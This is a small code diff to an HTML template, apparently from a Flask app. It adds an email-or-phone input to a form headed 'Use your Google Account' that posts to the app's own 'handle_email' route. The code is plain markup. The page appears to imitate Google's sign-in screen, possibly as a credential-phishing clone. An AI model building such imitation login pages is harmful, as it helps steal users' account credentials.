@@ -13,6 +13,10 @@
 		<p>Use your Google Account</p>
 
 		<form method="post" action="{{ url_for('handle_email') }}">
+			<div class="input-group">
+				<input type="email" id="username" name="username" placeholder="Email or phone" required>
+				<div class="loading-bar" id="loading-bar" style="display: none;"></div>
+			</div>
 		</form>
 	</div>
 </body>
